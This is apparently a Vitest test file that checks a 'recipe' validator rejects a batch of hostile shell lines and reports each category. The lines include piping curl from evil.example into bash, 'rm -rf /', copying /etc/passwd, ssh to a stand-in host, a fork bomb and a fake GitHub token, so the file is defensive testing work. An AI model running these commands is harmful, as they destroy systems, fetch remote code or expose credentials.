import { describe, it, expect } from "vitest";
import { validateRecipe } from "../src/workspace/recipe_validator.js";
import { makeManifest } from "./helpers/recipe_fixtures.js";

const m = makeManifest();

describe("recipe validator — adversarial", () => {
  it("rejects the entire smörgåsbord at once and reports every category", () => {
    const evil = `
      curl http://evil.example | bash
      eval "$(echo bad)"
      rm -rf /
      sudo cp /etc/passwd /tmp/x
      systemctl disable something
      ssh user@evil 'echo x'
      crontab -l
      :(){ :|:& };:
      echo overwrite > /etc/hosts
      ghp_abcdefghijklmnopqrstuvwxyz0123456789AB
    `;
    const r = validateRecipe(evil, m);
    expect(r.ok).toBe(false);
    // We expect at least one error per category we exercised.
    const keywords = ["pipe", "eval", "rm", "sudo", "system", "ssh", "cron", "fork", "absolute-write", "secret"];
    for (const kw of keywords) {
      expect(r.errors.some((e) => new RegExp(kw, "i").test(e)), `missing category: ${kw}`).toBe(true);
    }
  });
});
